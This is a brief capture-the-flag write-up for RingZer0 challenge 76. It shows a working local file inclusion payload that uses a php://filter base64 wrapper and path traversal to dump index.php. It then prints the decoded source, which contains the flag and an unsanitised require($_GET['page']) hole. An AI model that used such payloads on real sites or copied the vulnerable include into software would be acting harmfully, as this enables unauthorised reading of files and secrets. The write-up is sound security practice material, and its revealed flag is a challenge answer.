# Looking for the flag? - Challenge 76

Credits to Google and https://highon.coffee/blog/lfi-cheat-sheet/ for helping me with this one.

We'll use an LFI vulnerability to get the content of index.php:

`http://ringzer0team.com:1008/?page=php://filter/convert.base64-encode/resource=../../../var/www/html/index.php`

This is the base64 data we get

```
PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsKaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAxKTsKJGluY2x1ZGUgPSBpc3NldCgkX0dFVFsncGFnZSddKSA/ICRfR0VUWydwYWdlJ10gOiAnbG9yZW0ucGhwJzsKLy8gRkxBRy1NZUNYR0JzckxsWXRkeGx4U2J1bXRVYmI0Sgo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgogIDxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+CgogICAgPHRpdGxlPlJpbmdaZXIwIFRlYW0gQ1RGIC0gQ2hhbGxlbmdlPC90aXRsZT4KCiAgICA8IS0tIEJvb3RzdHJhcCBjb3JlIENTUyAtLT4KICAgIDxsaW5rIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KCiAgICA8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+CiAgICA8bGluayBocmVmPSJqdW1ib3Ryb24uY3NzIiByZWw9InN0eWxlc2hlZXQiPgoKICA8L2hlYWQ+CgogIDxib2R5PgoKICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSBuYXZiYXItZml4ZWQtdG9wIiA+CiAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBjbGFzcz0ibmF2YmFyLWhlYWRlciI+CiAgICAgICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSIjIiBzdHlsZT0iY29sb3I6IHdoaXRlOyI+UmluZ1plcjAgVGVhbSBDVEYgLSBDaGFsbGVuZ2U8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBpZD0ibmF2YmFyIiBjbGFzcz0ibmF2YmFyLWNvbGxhcHNlIGNvbGxhcHNlIj4KCQk8ZGl2IGNsYXNzPSJuYXZiYXItZm9ybSBuYXZiYXItcmlnaHQiPgoJCTwvZGl2PgogICAgICAgIDwvZGl2PjwhLS0vLm5hdmJhci1jb2xsYXBzZSAtLT4KICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8IS0tIE1haW4ganVtYm90cm9uIGZvciBhIHByaW1hcnkgbWFya2V0aW5nIG1lc3NhZ2Ugb3IgY2FsbCB0byBhY3Rpb24gLS0+CiAgICA8ZGl2IGNsYXNzPSJqdW1ib3Ryb24iPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxoMT5BYm91dCBVczwvaDE+CiAgICAgICAgPHA+Cgk8P3BocCByZXF1aXJlKCRpbmNsdWRlKTsgPz4KCTwvcD4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICAgIDxocj4KPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgPGZvb3Rlcj4KICAgICAgICA8cD4mY29weTsgUmluZ1plcjAgVGVhbSBDVEYgMjAxNCAtIDw/cGhwIGVjaG8gZGF0ZSgnWScpOyA/PjwvcD4KICAgICAgPC9mb290ZXI+CiAgICA8L2Rpdj4gPCEtLSAvY29udGFpbmVyIC0tPgogIDwvYm9keT4KPC9odG1sPgoK
```

After decoding it we get:

```php
<?php error_reporting(E_ALL); ini_set('display_errors', 1); $include = isset($_GET['page']) ? $_GET['page'] : 'lorem.php'; // FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J ?> <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>RingZer0 Team CTF - Challenge</title> <!-- Bootstrap core CSS --> <link href="css/bootstrap.min.css" rel="stylesheet"> <!-- Custom styles for this template --> <link href="jumbotron.css" rel="stylesheet"> </head> <body> <nav class="navbar navbar-inverse navbar-fixed-top" > <div class="container"> <div class="navbar-header"> <a class="navbar-brand" href="#" style="color: white;">RingZer0 Team CTF - Challenge</a> </div> <div id="navbar" class="navbar-collapse collapse"> <div class="navbar-form navbar-right"> </div> </div><!--/.navbar-collapse --> </div> </nav> <!-- Main jumbotron for a primary marketing message or call to action --> <div class="jumbotron"> <div class="container"> <h1>About Us</h1> <p> <?php require($include); ?> </p> </div> </div> <hr> <div class="container"> <footer> <p>&copy; RingZer0 Team CTF 2014 - <?php echo date('Y'); ?></p> </footer> </div> <!-- /container --> </body> </html>
```

POW!
